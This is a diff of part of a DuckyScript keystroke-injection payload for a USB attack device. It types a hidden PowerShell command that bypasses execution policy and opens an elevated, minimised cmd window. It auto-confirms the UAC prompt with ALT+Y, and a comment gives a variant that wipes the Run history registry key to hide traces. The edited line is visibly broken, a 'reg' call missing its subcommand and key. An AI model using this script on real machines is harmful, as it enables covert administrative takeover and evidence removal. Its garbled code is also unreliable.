@@ -5,7 +5,7 @@ GUI R
 DELAY 200
 REM		-- Start Powershell as administrator (alternatively you can substitute 'CMD' if you prefer). you can also use this command instead if you want to delete run history early on: powershell -NoP -NonI -W Hidden -Exec Bypass "Start-Process cmd -A '/t:fe /k mode con lines=1 cols=18&reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f' -Verb runAs"
 
-STRING powershell -NoP -NonI -W Hidden -Exec Bypass "Start-Process cmd -A '/t:fe /k mode con lines=1 cols=18&reg"
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "Start-Process cmd -A '/t:fe /k mode con lines=1 cols=18&reg /va /f' -Verb runAs"
 ENTER
 DELAY 600
 REM		-- Press 'ALT + Y' to choose 'Yes' option for UAC dialog box.
